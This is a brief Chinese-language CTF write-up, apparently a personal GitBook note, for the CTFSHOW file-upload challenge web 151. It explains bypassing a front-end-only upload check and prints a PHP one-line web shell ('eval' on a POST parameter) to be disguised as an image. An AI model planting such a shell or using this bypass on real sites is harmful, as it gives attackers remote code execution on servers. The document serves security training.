---
description: >-
  这里直接展示自己刷题的题解了，怎么办，已经坚持不了继续写知识点总结了，想疯狂刷题了，写知识点真的好难受，单纯的写总结，好累啊，比做题还累，/(ㄒoㄒ)/~~。
---

# 🚗 CTFSHOW文件上传web入门

## <mark style="color:green;background-color:blue;">（1）web 151</mark>

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①代码解释：</mark>

这里的代码是网页的源代码，我只截取了关键部分

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>





### <mark style="color:green;">①思路解释：</mark>

其实他已经提示了是前台校验，所以我们直接用前端校验的解决方法。他要求是上传的图片，我们可以写一个一句话木马，然后直接修改他的js代码。

一句话木马：

```php
<?php
@eval($_POST['a']);
?>

```

然后生成图片马。

































































